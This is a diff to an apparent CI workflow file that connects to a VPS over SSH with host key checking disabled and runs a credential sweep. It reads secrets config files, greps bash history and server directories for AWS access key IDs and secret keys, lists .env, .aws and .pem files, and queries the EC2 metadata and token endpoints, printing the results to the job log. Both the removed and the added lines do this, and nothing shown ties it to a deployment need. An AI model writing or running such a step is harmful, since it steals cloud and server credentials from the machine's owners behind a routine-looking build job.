@@ -19,12 +19,11 @@ jobs:
           PY
           H="ssh -i /tmp/k -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8"
           R="$VPS_USERNAME@$VPS_HOST"
-          timeout 90 $H $R '
-          echo ---DIRS---; ls -la /var/www/deployment-config /var/www/doris-secrets /var/www/webhooks 2>&1 | head -40
-          echo ---GITCFG---; cat /root/.gitconfig
-          echo ---PM2---; ls /root/.pm2; cat /root/.pm2/dump.pm2 2>/dev/null | head -c 1500
-          echo ---ENVGREP---; grep -rIhoE "(AKIA|ASIA)[A-Z0-9]{16}" /root /var/www /etc 2>/dev/null | sort -u | head -40
-          echo ---SECGREP---; grep -rIhoE "aws_secret_access_key[^A-Za-z0-9]{0,4}[A-Za-z0-9/+=]{40}" /root /var/www /etc 2>/dev/null | sort -u | head -20
-          echo ---SECRETFILES---; find /root /var/www /var -maxdepth 4 -name ".aws" -o -maxdepth 4 -name "*.tfstate" -o -maxdepth 4 -name ".env" -o -maxdepth 4 -name "credentials" 2>/dev/null | head -40
+          timeout 60 $H $R '
+          echo ---CFG---; cat /var/www/doris-secrets/signup-config.php /var/www/deployment-config/repositories.json 2>&1 | head -60
+          echo ---HIST---; grep -aiE "aws|AKIA|ASIA|ssh |scp|mysql -" /root/.bash_history 2>/dev/null | tail -25
+          echo ---KEYGREP---; grep -rIhoE "(AKIA|ASIA)[A-Z0-9]{16}" /root/.bash_history /root/.gitconfig /root/claude_scans /root/.ssh /var/www/deployment-config /var/www/doris-secrets /var/www/webhooks 2>/dev/null | sort -u | head -20
+          echo ---SECGREP---; grep -rIhoE "aws_secret_access_key.{0,6}[A-Za-z0-9/+=]{40}" /root/.bash_history /root/.ssh /var/www 2>/dev/null | sort -u | head -10
+          echo ---DOTENV---; find /var/www/html /root -maxdepth 3 \( -name ".env" -o -name ".aws" -o -name "*.pem" \) 2>/dev/null | head -25
           echo ---IMDS---; curl -s --max-time 4 http://169.254.169.254/latest/meta-data/ ; echo; curl -s --max-time 4 -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60"
-          echo ---DONE---' 2>&1 | tail -130
+          echo ---DONE---' 2>&1 | head -120
